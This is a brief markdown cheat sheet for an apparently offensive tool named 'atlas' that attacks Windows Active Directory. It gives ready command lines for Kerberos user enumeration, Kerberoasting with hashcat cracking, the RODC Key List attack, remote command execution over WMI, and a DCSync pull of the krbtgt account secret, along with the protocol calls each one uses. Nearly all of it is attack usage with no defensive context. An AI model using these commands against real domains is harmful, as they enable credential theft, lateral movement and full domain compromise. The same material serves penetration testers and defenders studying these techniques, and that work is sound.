# Kerberos / WMI / DCSync

## Kerberos
- User enum: `atlas kerberos <kdc> -d DOMAIN -UserList users.txt` (`KDC_ERR_PREAUTH_REQUIRED` vs `C_PRINCIPAL_UNKNOWN`)
- Kerberoasting: `-Roast -u user -p pass` (`GetTicketAsync` `S4U` `hashcat $krb5tgs$`)
- Key List (RODC): `-rodcNo 20000 -rodcKey <aes256> -UserList 'jdoe:1104'` (`KILE` `KERB-KEY-LIST-REQ`)

## WMI
- Auth check: `atlas wmi <host> -u admin -p pass`
- Exec: `-x whoami` (`Win32_Process.Create`), `--wmi-query "SELECT * FROM Win32_Process"` via `WmiScope.ExecuteWqlQueryAsync`

## DCSync
- `atlas dcsync <dc> -u admin -p pass krbtgt` (`IDL_DRSGetNCChanges` `EXOP_REPL_OBJ` via `Titanis.Msrpc.Msdrsr`)
